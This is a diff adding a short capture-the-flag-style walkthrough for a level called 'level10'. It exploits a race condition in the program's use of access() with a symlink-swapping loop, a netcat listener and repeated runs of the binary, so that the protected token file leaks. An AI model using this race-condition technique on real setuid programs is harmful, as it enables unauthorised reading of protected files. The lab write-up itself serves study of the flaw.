@@ -1,0 +1,17 @@
+This binary take two args. The first for a file to open and read and the second for the host. We can see with ltrace that the program use the access function that is vulnerable to race condition exploit.
+We can create a loop that build sym link very fast between token (file with no rights for us) and the executable (file with rights).
+
+$> while true; do ln -fs ~/level10 /tmp/link; ln -fs ~/token /tmp/link; done&
+
+We store the output of netcat into a file (We can see the port with ltrace).
+
+$> nc -lk 6969 > /tmp/out&
+
+Now we just have to launch the program with our sym link until it point to token after the verification.
+
+$> ./level10 /tmp/link 127.0.0.1
+
+If we check the output of netcat the flag is present.
+
+$> cat /tmp/out
+
